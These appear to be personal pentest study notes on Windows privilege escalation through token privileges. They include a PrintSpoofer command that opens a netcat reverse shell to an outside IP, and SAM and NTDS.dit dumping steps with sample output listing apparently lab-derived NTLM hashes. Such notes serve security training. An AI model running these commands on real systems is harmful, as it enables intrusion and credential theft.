---
publish: true
created: 2026-02-20T12:31:55.739+05:30
modified: 2026-06-22T08:53:24.392+05:30
---

Links:
<https://github.com/gtworek/Priv2Admin>
<https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens.html>
Command to see privileges

```powershell
whoami /privs
```

The status can be **Enabled or Disabled**. it should not be _Removed_.

Some known privileges which can get us escalation.

## SeImpersonatePrivilege

[https://www.hackingarticles.in](https://www.hackingarticles.in/windows-privilege-escalation-seimpersonateprivilege/) we use **PrintSpoofer** method.

```
PrintSpoofer.exe -c "c:\Temp\nc.exe 10.10.13.37 1337 -e cmd"
```

or use potatoes. [[NTLM Relay Attacks - potato]]

## SeAssignPrimaryTokenPrivilege

same as above.

## SeDebugPrivilege

<https://github.com/dollarboysushil/oscp-cpts-notes/blob/main/windows-privilege-escalation/user-privileges/sedebugprivilege.md>

## SeBackupPrivilege

LINK: <https://www.hackingarticles.in/addself-active-directory-abuse/>

### Saving SYSTEM / SAM

we basically save the SAM and SECURITY from the registries.

```
mkdir C:\Temp
cd C:\Temp
reg save hklm\sam c:\Temp\sam
reg save hklm\system c:\Temp\system
cd C:\Temp
download sam
download system
# files downloaded to your local directory
```

anaylyse the files with _pypykatz_.

```
$ pypykatz registry --sam sam system
WARNING:pypykatz:SECURITY hive path not supplied! Parsing SECURITY will not work
WARNING:pypykatz:SOFTWARE hive path not supplied! Parsing SOFTWARE will not work
============== SYSTEM hive secrets ==============
CurrentControlSet: ControlSet001
Boot Key: a42289f69adb35cd67d02cc84e69c314
============== SAM hive secrets ==============
HBoot Key: 44d8af1d608e25a6425a8261ae90ad8710101010101010101010101010101010
Administrator:500:aad3b435b51404eeaad3b435b51404ee:34386a771aaca697f447754e4863d38a:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

even secretsdump.py will do.

```
$ impacket-secretsdump -system system -sam sam local
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Target system bootKey: 0xa42289f69adb35cd67d02cc84e69c314
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:34386a771aaca697f447754e4863d38a:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Cleaning up...
```

### Saving SYSTEM / NTDS.dit

**diskshadow**:

write the script to allow us to backup c drive as `dinesh.dsh`

```
set context persistent nowriters
add volume c: alias dinesh
create
expose %dinesh% z:
```

and convert the encoding from unix to dos.

```
$ unix2dos dinesh.dsh
unix2dos: converting file dinesh.dsh to DOS format...
```

upload to `C:\Temp` and run it.

```
diskshadow /s dinesh.dsh
# after no errors, copy the ntds from z drive to C:\Temp
robocopy /b z:\windows\ntds . ntds.dit
# copy the SYSTEM too
reg save HKLM\SYSTEM SYSTEM
# download both to kali local
```

```
$ impacket-secretsdump -system system -ntds ntds.dit local
[SNIP]
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c
[*] Reading and decrypting hashes from ntds.dit
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:d2d93e137fac5066c56d1131ffbd540b:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
audit2020:1103:aad3b435b51404eeaad3b435b51404ee:600a406c2c1f2062eb9bb227bad654aa:::
support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::
[SNIP lot of users]
```
